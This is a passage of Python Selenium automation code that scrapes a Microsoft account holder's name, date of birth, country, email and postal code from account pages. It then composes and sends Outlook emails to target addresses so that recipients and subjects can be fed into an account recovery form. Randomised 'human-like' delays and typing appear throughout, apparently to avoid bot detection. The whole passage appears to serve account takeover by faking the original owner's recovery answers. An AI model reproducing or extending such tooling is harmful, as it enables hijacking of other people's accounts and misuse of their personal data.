                    parsed = self._parse_profile_dob(m.group(2))
                    if parsed:
                        dob_local = parsed
                        self.log_signal.emit(
                            "Profile: deriving DOB from text under Date of birth label."
                        )
            except Exception:
                pass

        # Try multiple methods for country
        country_selectors = [
            "//div[contains(@class, 'country')]//span",
            "//span[contains(normalize-space(.), 'Country')]/following-sibling::span",
            "//*[contains(@aria-label, 'country')]",
        ]

        for selector in country_selectors:
            try:
                element = self.driver.find_element(By.XPATH, selector)
                country_local = element.text.strip()
                if country_local and country_local != "Not Available":
                    self.log_signal.emit(f"Found Country using selector: {selector}")
                    break
            except Exception:
                continue

        # Fallback: regex search in body text
        if country_local == "Not Available":
            try:
                body_text = self.driver.find_element(By.TAG_NAME, "body").text
                m = re.search(
                    r"Country or region\s*\n\s*([A-Za-z\s]+)",
                    body_text,
                    re.MULTILINE,
                )
                if m:
                    country_local = m.group(1).splitlines()[0].strip()
            except Exception:
                self.log_signal.emit("Failed to extract Country with all methods.")

        try:
            email_elem = self.driver.find_element(
                By.XPATH, "//a[starts-with(@href, 'mailto:')]"
            )
            email_addr = email_elem.text.strip()
            if not email_addr:
                email_addr = (
                    email_elem.get_attribute("href").replace("mailto:", "").strip()
                )
            self.email_addr = email_addr
        except Exception:
            pattern = r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}"
            email_matches = re.findall(pattern, self.driver.page_source)
            if email_matches:
                email_addr = email_matches[0]
                self.email_addr = email_addr
            else:
                self.log_signal.emit("Failed to extract Email.")
                email_addr = "Not Available"
                self.email_addr = email_addr

        self.log_signal.emit("Profile info extracted:")
        self.log_signal.emit("  • Full Name: " + full_name)
        self.log_signal.emit("  • DOB: " + dob_local)
        self.log_signal.emit("  • Country: " + country_local)
        self.log_signal.emit("  • Email: " + email_addr)

        self.dob = dob_local
        self.country = country_local

        if full_name != "Not Available":
            name_parts = full_name.split()
            if len(name_parts) > 1:
                self.first_name = " ".join(name_parts[:-1])
                self.last_name = name_parts[-1]
            else:
                self.first_name = full_name
                self.last_name = ""
        else:
            self.first_name = "Not Available"
            self.last_name = "Not Available"

        # Extra refinement: even if we built names from full_name, try to
        # override with values read directly from the 'Edit name' dialog when
        # available. This makes first/last name for the recovery form match
        # exactly what Microsoft shows in the profile UI.
        try:
            first_from_edit, last_from_edit = self._extract_first_last_from_edit_name()
            if first_from_edit or last_from_edit:
                if first_from_edit:
                    self.first_name = first_from_edit
                if last_from_edit:
                    self.last_name = last_from_edit
                self.log_signal.emit(
                    "Profile: overriding first/last name from 'Edit name' dialog for recovery form."
                )
        except Exception as e:
            self.log_signal.emit(
                f"Profile: non-fatal error while refining names from 'Edit name' dialog: {e}"
            )

        self.log_signal.emit(
            f"[BOT] Identity data from profile: First Name={self.first_name}, "
            f"Last Name={self.last_name}, DOB={self.dob}, Country={self.country}"
        )
        self.progress_update_signal.emit(30, "Profile information extracted.")

    def _extract_postal_code(self):
        """Navigates to address book and extracts postal code."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(35, "Extracting postal code...")
        self.driver.get("https://account.microsoft.com/billing/addresses")
        self.log_signal.emit(
            "Navigating to Address Book Section (for postal code extraction)..."
        )
        WebDriverWait(self.driver, 20).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        # Wait for dynamic content
        WebDriverWait(self.driver, 15).until(
            lambda d: d.execute_script("return document.readyState") == "complete"
        )
        self.cpu_intensive_delay(0.5, 1.0)  # Human-like pause after navigating to addresses
        time.sleep(2.0)

        postal_codes_str = "Not Found"
        try:
            # Enhanced selector strategy
            combined_xpath = (
                "//div[contains(@class, 'ms-StackItem')] | "
                "//div[contains(@class, 'addressCard')] | "
                "//div[contains(@class, 'm-card')] | "
                "//address | "
                "//div[contains(@data-test-id, 'address-card')]"
            )
            try:
                address_blocks = self.driver.find_elements(By.XPATH, combined_xpath)
            except Exception:
                address_blocks = []

            extracted_addresses = []
            unwanted_keywords = [
                "add new",
                "billing info",
                "shipping info",
                "address book",
                "payment options",
            ]
            for block in address_blocks:
                text = block.text.strip()
                if (
                    text
                    and not any(kw in text.lower() for kw in unwanted_keywords)
                    and re.search(r"\d+", text)
                ):
                    extracted_addresses.append(text)

            seen = set()
            unique_addresses = [
                addr
                for addr in extracted_addresses
                if addr.lower() not in seen and not seen.add(addr.lower())
            ]

            postal_codes_set = set()
            for addr in unique_addresses:
                # Capture patterns like 13148-218, 13148-0218, 13148-02189, etc.
                dash_pattern = r"\b\d{4,5}-\d{2,4}\b"
                dash_codes = re.findall(dash_pattern, addr)
                if dash_codes:
                    postal_codes_set.update(dash_codes)

                # Also allow a space instead of dash and normalize to dash
                space_pattern = r"\b\d{4,5}\s+\d{2,4}\b"
                space_codes = re.findall(space_pattern, addr)
                if space_codes:
                    space_codes_normalized = [
                        code.replace(" ", "-") for code in space_codes
                    ]
                    postal_codes_set.update(space_codes_normalized)

                # Continuous digits like 13148218 -> format as 13148-218
                extended_pattern = r"\b\d{7,9}\b"
                extended_codes = re.findall(extended_pattern, addr)
                if extended_codes:
                    formatted_codes = [
                        f"{code[:5]}-{code[5:]}" for code in extended_codes
                    ]
                    postal_codes_set.update(formatted_codes)

                # Fallback: if nothing matched yet, take the longest simple block
                simple_codes = re.findall(r"\b\d{4,6}\b", addr)
                if simple_codes and not postal_codes_set:
                    sorted_codes = sorted(simple_codes, key=len, reverse=True)
                    postal_codes_set.add(sorted_codes[0])

            # Fallback: if no postal codes found yet, scan the whole body text
            if not postal_codes_set:
                try:
                    body_text = self.driver.find_element(By.TAG_NAME, "body").text
                    # Look for US-style zip codes (5 digits)
                    fallback_codes = re.findall(r"\b\d{5}(?:-\d{4})?\b", body_text)
                    if fallback_codes:
                        postal_codes_set.update(fallback_codes)
                    
                    # Look for labeled postal codes
                    labeled_pattern = r"(?:Postal code|Zip code|Zip|Postal)\s*:?\s*([A-Z0-9\-\s]{4,10})"
                    labeled_matches = re.findall(labeled_pattern, body_text, re.IGNORECASE)
                    if labeled_matches:
                        for m in labeled_matches:
                            clean = m.strip()
                            if len(clean) >= 4 and any(c.isdigit() for c in clean):
                                postal_codes_set.add(clean)
                except Exception:
                    pass

            postal_codes_list = list(postal_codes_set)
            postal_codes_list.sort(key=lambda x: ("-" in x, len(x)), reverse=True)

            chosen_postal = postal_codes_list[0] if postal_codes_list else ""
            country_lower = (self.country or "").strip().lower()
            if country_lower and country_lower not in ("not available",):
                if country_lower in ("united states", "united states of america", "usa"):
                    self.postal = chosen_postal
                else:
                    self.postal = ""
            else:
                self.postal = chosen_postal

            self.log_signal.emit(
                f"[BOT] Identity postal code candidate: {self.postal or 'Not Available'}"
            )
            postal_codes_str = (
                ", ".join(postal_codes_list) if postal_codes_list else "Not Found"
            )

        except Exception as e:
            self.log_signal.emit(
                f"Failed to extract postal code from addresses: {str(e)}"
            )
            self.postal = ""
            postal_codes_str = "Not Found"

        self.progress_update_signal.emit(40, "Postal code extraction complete.")
        time.sleep(3)
        return postal_codes_str

    def _wait_for_send_button_icon(self, timeout=15):
        """Wait until a Send button becomes clickable using several robust selectors."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")

        selectors = [
            (By.CSS_SELECTOR, 'button[aria-label="Send"]'),
            (By.CSS_SELECTOR, 'button[aria-label*="send"]'),
            (By.CSS_SELECTOR, 'button[title="Send"]'),
            (By.XPATH, "//button[contains(@aria-label, 'Send')]"),
            (By.XPATH, "//button[contains(@title, 'Send')]"),
            (By.XPATH, "//button[.//span[normalize-space()='Send']]"),
            (By.XPATH, "//span[normalize-space()='Send']/ancestor::button[1]"),
        ]

        for by, selector in selectors:
            try:
                element = WebDriverWait(self.driver, timeout).until(
                    EC.element_to_be_clickable((by, selector))
                )
                self.log_signal.emit(
                    f"Located Send control using selector: {selector}"
                )
                return element
            except TimeoutException:
                continue

        # Fallback: language-agnostic geometry-based search for a primary
        # action button in the compose dialog. This is similar in spirit to
        # the To-field heuristic and does not rely on the word "Send".
        try:
            self.log_signal.emit(
                "Standard Send button selectors failed; trying geometry-based heuristic..."
            )
            element = self.driver.execute_script(
                """
                var dialog = document.querySelector('div[role="dialog"]') || document.body;
                if (!dialog) { dialog = document.body; }
                var buttons = dialog.querySelectorAll('button');
                var best = null;
                var bestScore = -Infinity;
                for (var i = 0; i < buttons.length; i++) {
                    var b = buttons[i];
                    var rect = b.getBoundingClientRect();
                    if (!rect || rect.width < 60 || rect.height < 24) continue;
                    if (rect.bottom < 0 || rect.top > window.innerHeight) continue;
                    var style = window.getComputedStyle(b);
                    if (style.display === 'none' || style.visibility !== 'visible') continue;
                    // Prefer buttons near the upper area; weight right-hand side
                    // slightly so we don't accidentally pick side navigation.
                    var score = -rect.top + rect.right * 0.1;
                    if (score > bestScore) {
                        bestScore = score;
                        best = b;
                    }
                }
                return best;
                """
            )
            if element:
                self.log_signal.emit("Located Send control using geometry-based heuristic.")
                return element
        except Exception as e:
            self.log_signal.emit(f"Generic Send-button heuristic failed: {e}")

        raise TimeoutException("Could not locate a clickable Send button.")

    def _click_new_message_button(self, timeout=15):
        """Tries multiple selectors to open the new message composer via a button click."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        selectors = [
            (By.CSS_SELECTOR, 'button[aria-label="New message"]'),
            (By.CSS_SELECTOR, 'button[aria-label*="New mail"]'),
            (By.XPATH, "//button[contains(@aria-label, 'New message')]"),
            (By.XPATH, "//button[contains(@aria-label, 'New mail')]"),
            (By.XPATH, "//button[.//span[normalize-space()='New message']]"),
            (By.XPATH, "//span[normalize-space()='New message']/ancestor::button[1]"),
            (By.XPATH, "//button[.//span[normalize-space()='New mail']]"),
            (By.XPATH, "//span[normalize-space()='New mail']/ancestor::button[1]"),
            (
                By.XPATH,
                "//span[contains(@class,'textContainer') and normalize-space()='New mail']/ancestor::button[1]",
            ),
            (By.XPATH, "//button[contains(@data-task, 'newmessage')]"),
        ]

        for by, selector in selectors:
            try:
                button = WebDriverWait(self.driver, timeout).until(
                    EC.element_to_be_clickable((by, selector))
                )
                button.click()
                self.log_signal.emit(
                    f"Clicked New Message button using selector: {selector}"
                )
                return True
            except TimeoutException:
                continue
            except Exception as e:
                self.log_signal.emit(
                    f"Error clicking New Message button ({selector}): {e}"
                )
        return False

    def _open_outlook_new_message_composer(self):
        """Ensures the Outlook compose dialog is open using multiple strategies."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.log_signal.emit("Opening Outlook new mail composer...")
        composer_opened = False

        # Ensure page is ready before trying to interact
        try:
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
        except TimeoutException:
            self.log_signal.emit("Warning: Body element not found, proceeding anyway...")

        # 1) Prefer clicking the visible "New mail" / "New message" button (fast & reliable).
        self.log_signal.emit("Trying to open composer by clicking the New mail button...")
        if self._click_new_message_button():
            try:
                time.sleep(random.uniform(0.5, 1.0))  # Wait for button click to register
                self._wait_for_composer_visible(timeout=20)
                composer_opened = True
                self.log_signal.emit("Composer opened via New mail button click.")
            except Exception as e:
                composer_opened = False
                self.log_signal.emit(
                    f"Composer still not visible after button click: {e}"
                )

        # 2) Fallback: use the 'N' keyboard shortcut if the button path failed.
        if not composer_opened:
            try:
                self.log_signal.emit(
                    "Falling back to keyboard shortcut 'N' to open new mail composer..."
                )
                # Ensure page has focus - more thorough approach
                body = WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )

                # Human-like pause before action (slightly slower)
                time.sleep(random.uniform(1.0, 2.0))

                # Method 1: Click body to ensure focus, then send key
                try:
                    self.driver.execute_script(
                        "window.scrollTo(0, window.innerHeight / 2);"
                    )
                    time.sleep(random.uniform(0.8, 1.5))

                    body.click()
                    time.sleep(random.uniform(1.0, 1.8))

                    ActionChains(self.driver).send_keys("n").perform()
                    self.log_signal.emit("Sent 'N' key via ActionChains")
                    time.sleep(random.uniform(0.8, 1.2))
                except Exception as e1:
                    self.log_signal.emit(
                        f"Keyboard method 1 failed: {e1}, trying JS focus method..."
                    )
                    try:
                        self.driver.execute_script(
                            "document.body.focus(); document.activeElement = document.body;"
                        )
                        time.sleep(random.uniform(1.0, 1.8))
                        ActionChains(self.driver).send_keys("n").perform()
                        self.log_signal.emit(
                            "Sent 'N' key via JavaScript focus + ActionChains"
                        )
                        time.sleep(random.uniform(0.8, 1.2))
                    except Exception as e2:
                        self.log_signal.emit(
                            f"Keyboard method 2 failed: {e2}, trying JS key events..."
                        )

                # Method 3: Direct JavaScript key events as last resort
                try:
                    self.driver.execute_script(
                        """
                        var keydownEvent = new KeyboardEvent('keydown', {
                            key: 'n', code: 'KeyN', keyCode: 78, which: 78,
                            bubbles: true, cancelable: true
                        });
                        document.body.dispatchEvent(keydownEvent);

                        var keypressEvent = new KeyboardEvent('keypress', {
                            key: 'n', code: 'KeyN', keyCode: 110, which: 110,
                            bubbles: true, cancelable: true
                        });
                        document.body.dispatchEvent(keypressEvent);

                        var keyupEvent = new KeyboardEvent('keyup', {
                            key: 'n', code: 'KeyN', keyCode: 78, which: 78,
                            bubbles: true, cancelable: true
                        });
                        document.body.dispatchEvent(keyupEvent);
                        """
                    )
                    self.log_signal.emit("Sent 'N' key via JavaScript events")
                    time.sleep(random.uniform(0.8, 1.2))
                except Exception as e3:
                    self.log_signal.emit(f"JavaScript key events failed: {e3}")

                # Wait for composer to appear after keyboard shortcut
                time.sleep(random.uniform(3.0, 4.5))
                self._wait_for_composer_visible(timeout=20)
                composer_opened = True
                self.log_signal.emit("Composer opened via keyboard shortcut.")
            except Exception as e:
                self.log_signal.emit(
                    f"Keyboard shortcut 'N' did not open composer: {e}"
                )

        # Final fallback: try direct URL navigation
        if not composer_opened:
            try:
                self.log_signal.emit("Trying direct URL navigation to composer...")
                self.driver.get("https://outlook.live.com/mail/0/deeplink/compose")
                time.sleep(random.uniform(3.5, 5.0))  # Slower wait
                self._wait_for_composer_visible(timeout=15)
                composer_opened = True
                self.log_signal.emit("Composer opened via direct URL.")
            except Exception as e:
                self.log_signal.emit(f"Direct URL navigation failed: {e}")

        if not composer_opened:
            self.log_signal.emit(
                "Warning: Could not confirm composer opened, but proceeding anyway..."
            )
            time.sleep(random.uniform(3.0, 4.5))

    def _wait_for_composer_visible(self, timeout=20):
        """Waits for the Outlook compose dialog to become visible with better timeout handling."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")

        self.log_signal.emit(f"Waiting for composer to appear (timeout: {timeout}s)...")
        start_time = time.time()

        selectors = [
            (By.CSS_SELECTOR, 'input[aria-label*="To" i]'),
            (By.CSS_SELECTOR, 'div[aria-label*="To" i]'),
            (By.CSS_SELECTOR, 'input[aria-label*="To"]'),
            (By.CSS_SELECTOR, 'div[aria-label*="To"]'),
            (
                By.XPATH,
                "//div[@role='textbox' and contains(translate(@aria-label, "
                "'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'message body')]",
            ),
            (
                By.XPATH,
                "//textarea[contains(translate(@aria-label, "
                "'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'message body')]",
            ),
            (By.XPATH, "//div[contains(@aria-label, 'Message body')]"),
            (
                By.XPATH,
                "//div[@role='textbox' and contains(@aria-label, 'Message body')]",
            ),
        ]

        # Try each selector with shorter individual timeouts
        for by, selector in selectors:
            if time.time() - start_time > timeout:
                break
            try:
                remaining_time = max(2, timeout - (time.time() - start_time))
                WebDriverWait(self.driver, min(remaining_time, 5)).until(
                    EC.visibility_of_element_located((by, selector))
                )
                self.log_signal.emit(
                    f"Composer detected via selector: {selector}"
                )
                time.sleep(random.uniform(0.5, 1.0))  # Slower wait for composer to stabilize
                return
            except TimeoutException:
                continue
            except Exception as e:
                self.log_signal.emit(f"Error checking selector {selector}: {e}")
                continue

        # Try JavaScript detection as fallback
        self.log_signal.emit("Primary selectors failed, trying JavaScript detection...")
        try:
            composer_found = self.driver.execute_script("""
                var toField = document.querySelector('input[aria-label*="To" i], div[aria-label*="To" i][contenteditable="true"]');
                var bodyField = document.querySelector('div[role="textbox"][aria-label*="body" i]');
                return toField || bodyField;
            """)
            if composer_found:
                self.log_signal.emit("Composer detected via JavaScript.")
                time.sleep(random.uniform(0.5, 1.0))  # Slower pause
                return
        except Exception as e:
            self.log_signal.emit(f"JavaScript detection failed: {e}")

        # Try simpler selectors
        simple_selectors = [
            (By.CSS_SELECTOR, 'div[role="textbox"]'),
            (By.CSS_SELECTOR, 'input[type="text"]'),
            (By.CSS_SELECTOR, 'div[contenteditable="true"]'),
        ]
        for by, selector in simple_selectors:
            if time.time() - start_time > timeout:
                break
            try:
                remaining_time = max(2, timeout - (time.time() - start_time))
                element = WebDriverWait(self.driver, min(remaining_time, 3)).until(
                    EC.presence_of_element_located((by, selector))
                )
                # Check if it's likely the composer
                if element.is_displayed():
                    self.log_signal.emit(f"Composer detected via fallback selector: {selector}")
                    time.sleep(random.uniform(0.5, 1.0))  # Slower pause
                    return
            except (TimeoutException, Exception):
                continue

        # Final check - if we've waited long enough, proceed anyway
        elapsed = time.time() - start_time
        if elapsed >= timeout * 0.7:  # If we've waited 70% of timeout
            self.log_signal.emit(f"Warning: Composer not fully detected after {elapsed:.1f}s, proceeding anyway...")
            time.sleep(random.uniform(0.5, 1.0))  # Slower pause
            return

        raise TimeoutException(f"Composer did not become visible within {timeout} seconds.")

    def _find_to_field(self):
        """Try to find Outlook 'To' field explicitly with timeout protection."""
        self.log_signal.emit("Looking for 'To' field...")

        # Human-like pause - looking at the screen (slower)
        time.sleep(random.uniform(0.5, 1.0))  # Slower human-like wait for composer to be ready

        # First, try the currently focused element. Outlook usually focuses the
        # 'To' field automatically when opening the composer, and this works
        # regardless of UI language.
        try:
            active = self.driver.switch_to.active_element
            if active is not None and active.is_displayed():
                self.log_signal.emit("'To' field guessed from current active element.")
                return active
        except Exception:
            pass

        max_wait_time = 15  # Maximum time to spend looking
        start_time = time.time()

        selectors = [
            (By.CSS_SELECTOR, 'input[aria-label="To"]'),
            (By.CSS_SELECTOR, 'input[aria-label*="To"]'),
            (By.CSS_SELECTOR, 'input[aria-label*="to"]'),
            (By.XPATH, "//input[@role='combobox' and contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),'to')]"),
            (By.XPATH, "//div[@role='textbox' and contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),'to')]"),
            (By.CSS_SELECTOR, 'div[aria-label*="To"]'),
            (By.CSS_SELECTOR, 'div[aria-label*="to"]'),
            (By.XPATH, "//div[contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'to') and @contenteditable='true']"),
            (By.CSS_SELECTOR, '[aria-label*="To"]'),
            (By.CSS_SELECTOR, '[aria-label*="to"]'),
            (By.XPATH, "//input[contains(@placeholder, 'To') or contains(@placeholder, 'to')]"),
            (By.XPATH, "//div[@contenteditable='true' and contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'to')]"),
        ]
        for by, selector in selectors:
            if time.time() - start_time > max_wait_time:
                self.log_signal.emit("Timeout reached while searching for To field, trying fallbacks...")
                break

            try:
                remaining_time = max(2, max_wait_time - (time.time() - start_time))
                field = WebDriverWait(self.driver, min(remaining_time, 5)).until(
                    EC.element_to_be_clickable((by, selector))
                )
                self.log_signal.emit(f"'To' field found using selector: {selector}")
                return field
            except (TimeoutException, Exception) as e:
                continue

        # Try JavaScript approach
        try:
            self.log_signal.emit("Trying JavaScript to locate To field...")
            field = self.driver.execute_script("""
                var allInputs = document.querySelectorAll('input, div[contenteditable="true"]');
                for (var i = 0; i < allInputs.length; i++) {
                    var elem = allInputs[i];
                    var label = elem.getAttribute('aria-label') || '';
                    var placeholder = elem.getAttribute('placeholder') || '';
                    if (label.toLowerCase().includes('to') || placeholder.toLowerCase().includes('to')) {
                        return elem;
                    }
                }
                return null;
            """)
            if field:
                self.log_signal.emit("'To' field found via JavaScript.")
                return field
        except Exception as e:
            self.log_signal.emit(f"JavaScript search failed: {e}")

        # As a final fallback, use a geometry-based heuristic: pick the first
        # reasonably large text-like element near the top of the composer.
        # This does not rely on any particular language.
        try:
            self.log_signal.emit(
                "Trying geometry-based heuristic to locate To field (language-agnostic)..."
            )
            field = self.driver.execute_script(
                """
                var root = document.querySelector('div[role="dialog"]') || document.body;
                if (!root) { root = document.body; }
                var candidates = root.querySelectorAll('input, div[contenteditable="true"]');
                var best = null;
                var bestScore = -Infinity;
                for (var i = 0; i < candidates.length; i++) {
                    var el = candidates[i];
                    var rect = el.getBoundingClientRect();
                    if (!rect || rect.width < 150 || rect.height < 20) continue;
                    if (rect.top < 0 || rect.top > window.innerHeight) continue;
                    var style = window.getComputedStyle(el);
                    if (style.display === 'none' || style.visibility !== 'visible') continue;
                    // Prefer elements near the upper area; weight right-hand side
                    // slightly so we don't accidentally pick side navigation.
                    var score = -rect.top + rect.right * 0.1;
                    if (score > bestScore) {
                        bestScore = score;
                        best = el;
                    }
                }
                return best;
                """
            )
            if field:
                self.log_signal.emit("'To' field found via geometry-based heuristic.")
                return field
        except Exception as e:
            self.log_signal.emit(f"Geometry-based To-field search failed: {e}")

        # If we reach here, we were not able to positively identify a To field.

    def _process_outlook_sent_items(self):
        """
        Navigates to Outlook, directly composes and sends a new email.
        Captures recipients and subject for recovery form.
        """
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")

        self.progress_update_signal.emit(42, "Processing Outlook Sent Items...")
        self.log_signal.emit("Navigating to Outlook Compose (Advanced)...")
        self.driver.get("https://outlook.live.com/mail/0/deeplink/compose")

        # Wait for page to load properly (optimized with better timeout handling)
        try:
            self.log_signal.emit("Waiting for Outlook page to load...")
            # Wait for basic page structure first (more lenient)
            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            self.log_signal.emit("Page body found, waiting for content...")

            # Wait for ready state with shorter timeout
            start_time = time.time()
            while time.time() - start_time < 10:
                try:
                    ready_state = self.driver.execute_script("return document.readyState")
                    if ready_state == "complete":
                        break
                    time.sleep(0.5)
                except Exception:
                    break

            # Additional wait for Outlook's dynamic content (non-blocking)
            try:
                WebDriverWait(self.driver, 5).until(
                    lambda d: len(d.find_elements(By.TAG_NAME, "div")) > 10
                )
            except TimeoutException:
                self.log_signal.emit("Warning: Dynamic content still loading, proceeding...")

            self.log_signal.emit("Outlook page loaded successfully.")
            time.sleep(0.5)  # Optimized human-like pause to look at page

            # If Microsoft sent us to the generic Outlook marketing landing page
            # instead of the actual mailbox UI, try to move into Outlook Web Mail.
            self._handle_outlook_marketing_landing()

        except TimeoutException as e:
            self.log_signal.emit(f"Warning: Page load timeout ({e}), proceeding anyway...")
            time.sleep(random.uniform(2, 3))
        except Exception as e:
            self.log_signal.emit(f"Warning: Page load error ({e}), proceeding anyway...")
            time.sleep(random.uniform(2, 3))

        # Check for storage full indicators before trying to compose
        try:
            time.sleep(1.5)
            src = self.driver.page_source.lower()
            try:
                visible_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            except Exception:
                visible_text = ""

            keywords = ["storage is full", "quota exceeded", "mailbox is full", "storage limit", "out of storage", "upgrade storage", "free up space", "microsoft storage"]
            if any(x in src for x in keywords) or any(x in visible_text for x in keywords):
                self.log_signal.emit("[BOT] Outlook Storage Is Full (Still Trying to Recover)")
                self.collected_subjects = [
"Hello! I am automating some things.",
                    "Hey! This is Plan B",
                ]
                return
        except Exception:
            pass

        self.log_signal.emit(
            "Proceeding directly to compose a new email..."
        )

        self.collected_emails = []
        self.collected_subjects = []

        try:
            try:
                self._wait_for_composer_visible(timeout=10)
                self.log_signal.emit("Composer opened via deep link.")
            except Exception:
                self._open_outlook_new_message_composer()
            # Human-like pause after opening composer (slower)
            time.sleep(0.5)
        except Exception as e:
            # If composer failed, check for storage issues one more time as they might be the cause
            try:
                src = self.driver.page_source.lower()
                if any(x in src for x in ["storage is full", "quota exceeded", "mailbox is full", "storage limit"]):
                    self.log_signal.emit("[BOT] Outlook Storage Is Full (Still Trying to Recover)")
                    self.collected_subjects = [
"Hello! I am automating some things.",
                        "Hey! This is Plan B",
                    ]
                    return
            except Exception:
                pass
            self.log_signal.emit(f"Failed to open new mail composer: {e}")
            raise

        target_emails_for_one_send = self.target_emails

        try:
            # Human-like pause before starting to fill form (slower)
            time.sleep(0.5)

            # Try to locate the 'To' field a few times; only type emails if found.
            to_field = None
            for attempt in range(3):
                to_field = self._find_to_field()
                if to_field:
                    break

                # Try alternative: use JavaScript to focus on To field
                try:
                    self.log_signal.emit(
                        f"Trying JavaScript to find To field (attempt {attempt + 1})..."
                    )
                    self.driver.execute_script("""
                        var toInputs = document.querySelectorAll('input[aria-label*="To"], div[aria-label*="To"][contenteditable="true"]');
                        if (toInputs.length > 0) {
                            toInputs[0].focus();
                            toInputs[0].click();
                        }
                    """)
                    time.sleep(0.5)
                    to_field = self.driver.switch_to.active_element
                    if to_field:
                        break
                except Exception as e:
                    self.log_signal.emit(f"JavaScript fallback failed: {e}")

                time.sleep(1.0)

            if not to_field:
                self.log_signal.emit(
                    "Aborting email send: could not find 'To' field after multiple attempts."
                )
                raise Exception("Could not find 'To' field to type recipients.")

            # Ensure focus on To field with multiple attempts (human-like, slower)
            try:
                # Scroll into view
                self.driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'smooth'});", to_field)
                time.sleep(0.2)  # Slower human-like pause

                # Click on body to ensure focus
                to_field.click()
                time.sleep(0.2)  # Slower human-like pause

                # Try JavaScript click as well
                self.driver.execute_script("arguments[0].focus(); arguments[0].click();", to_field)
                time.sleep(0.2)  # Slower human-like pause
            except Exception as e:
                self.log_signal.emit(f"Focus attempt warning: {e}")

            # Type all recipients separated by semicolons
            all_recipients_str = "; ".join(target_emails_for_one_send)

            # Clear field first if needed
            try:
                to_field.clear()
            except Exception:
                try:
                    self.driver.execute_script("arguments[0].value = '';", to_field)
                except Exception:
                    pass

            self._human_like_type(to_field, all_recipients_str)
            self.collected_emails = target_emails_for_one_send.copy()
            self.log_signal.emit(f"Entered recipients: {all_recipients_str}")

            # Human-like pause after typing recipients (slower)
            self.cpu_intensive_delay(0.5, 1.0)  # Slower human-like pause

            # Move to subject field explicitly
            subject_field = None
            subject_selectors = [
                (By.CSS_SELECTOR, 'input[placeholder="Add a subject"]'),
                (By.CSS_SELECTOR, 'input[aria-label="Add a subject"]'),
                (By.CSS_SELECTOR, 'input[aria-label*="Subject"]'),
                (By.XPATH, "//input[@name='subject']"),
            ]
            for by, selector in subject_selectors:
                try:
                    subject_field = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((by, selector))
                    )
                    self.log_signal.emit(
                        f"Subject field found using selector: {selector}"
                    )
                    break
                except Exception:
                    continue
            if subject_field is None:
                self.log_signal.emit(
                    "Could not find subject field via selectors, using TAB fallback..."
                )
                actions = ActionChains(self.driver)
                actions.send_keys(Keys.TAB).send_keys(Keys.TAB).perform()
                try:
                    subject_field = self.driver.switch_to.active_element
                except Exception:
                    subject_field = None

            # If TAB fallback did not work, try a generic JavaScript search for a
            # text input inside the composer dialog (language-agnostic).
            if subject_field is None:
                try:
                    self.log_signal.emit(
                        "Subject field still not found; trying generic JS search inside composer..."
                    )
                    subject_field = self.driver.execute_script(
                        """
                        var dialog = document.querySelector('div[role="dialog"]') || document.body;
                        if (!dialog) { dialog = document.body; }
                        var inputs = dialog.querySelectorAll('input[type="text"]');
                        if (inputs.length > 0) { return inputs[0]; }
                        return null;
                        """
                    )
                    if subject_field:
                        self.log_signal.emit("Subject field found via generic JS search.")
                except Exception as e:
                    self.log_signal.emit(f"Subject JS generic search failed: {e}")

            if subject_field is not None:
                # Human-like pause before typing subject (slower)
                time.sleep(0.2)
                subject_text = random.choice(self.random_subjects)
                self._human_like_type(subject_field, subject_text)
                self.collected_subjects.append(subject_text)
                self.log_signal.emit(f"Entered subject: '{subject_text}'")
                time.sleep(0.2)  # Slower human-like pause
            else:
                self.log_signal.emit(
                    "[BOT] Could not locate Outlook subject field even after fallbacks; "
                    "please type the subject manually for this run."
                )

            # Message body
            body_field = None
            body_selectors = [
                (
                    By.XPATH,
                    "//div[@role='textbox' and contains(translate(@aria-label,"
                    "'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'message body')]",
                ),
                (By.XPATH, "//div[contains(@aria-label,'Message body')]")
            ]
            for by, selector in body_selectors:
                try:
                    body_field = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((by, selector))
                    )
                    self.log_signal.emit(
                        f"Message body found using selector: {selector}"
                    )
                    break
                except Exception:
                    continue
            if body_field is None:
                self.log_signal.emit(
                    "Could not find message body explicitly, using TAB fallback..."
                )
                try:
                    ActionChains(self.driver).send_keys(Keys.TAB).perform()
                    body_field = self.driver.switch_to.active_element
                except Exception:
                    body_field = None

            # If TAB fallback did not work, try a generic JS search that looks
            # for a large editable textbox in the composer (language-agnostic).
            if body_field is None:
                try:
                    self.log_signal.emit(
                        "Body field still not found; trying generic JS search inside composer..."
                    )
                    body_field = self.driver.execute_script(
                        """
                        var dialog = document.querySelector('div[role="dialog"]') || document.body;
                        if (!dialog) { dialog = document.body; }
                        var editors = dialog.querySelectorAll('div[role="textbox"], div[contenteditable="true"]');
                        if (editors.length > 0) { return editors[editors.length - 1]; }
                        return null;
                        """
                    )
                    if body_field:
                        self.log_signal.emit("Message body found via generic JS search.")
                except Exception as e:
